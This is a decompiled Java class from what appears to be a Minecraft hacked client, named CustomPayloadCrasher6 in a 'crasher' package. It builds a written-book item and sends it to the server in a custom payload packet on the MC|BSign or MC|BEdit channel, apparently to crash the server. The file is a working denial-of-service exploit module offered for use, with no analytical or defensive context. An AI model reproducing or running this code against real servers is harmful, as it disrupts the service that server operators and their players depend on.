// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher.cpc;

import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketCustomPayload;
import java.util.Random;
import net.minecraft.client.Minecraft;
import net.minecraft.network.PacketBuffer;
import io.netty.buffer.Unpooled;
import net.minecraft.item.ItemStack;
import net.minecraft.init.Items;

public class CustomPayloadCrasher6
{
    public static void start() {
        final ItemStack book = new ItemStack(Items.WRITTEN_BOOK);
        final PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
        packetBuffer.writeItemStackToBuffer(book);
        Minecraft.getMinecraft().player.connection.sendPacket(new CPacketCustomPayload(new Random().nextBoolean() ? "MC|BSign" : "MC|BEdit", packetBuffer));
    }
}
